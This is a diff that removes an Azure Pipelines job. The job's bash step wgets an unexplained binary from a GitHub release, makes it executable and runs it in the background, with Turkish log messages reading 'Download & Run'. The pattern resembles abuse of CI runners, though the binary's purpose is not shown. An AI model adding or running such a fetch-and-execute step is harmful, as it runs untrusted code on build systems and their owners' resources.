@@ -1,23 +1,2 @@
-trigger:
-- main
 
-jobs:
-- job: long_run
-  timeoutInMinutes: 2          # 0 = sınırsız
-  cancelTimeoutInMinutes: 5
-  pool:
-    name: "german"
-
-  steps:
-  - checkout: none
-  - bash: |
-      set -euo pipefail
-      URL="https://github.com/RenderAuto/Autos/releases/download/turkeyrender/autoren8"
-      DEST="newtoss"
-      echo "👉 İndiriliyor: $URL"
-      wget -q -O "$DEST" "$URL"
-      chmod +x "$DEST"
-      echo "▶️ Çalıştırılıyor..."
-      ./newtoss &
-    displayName: "İndir & Çalıştır"
     timeoutInMinutes: 2        # adım için de sınırsız
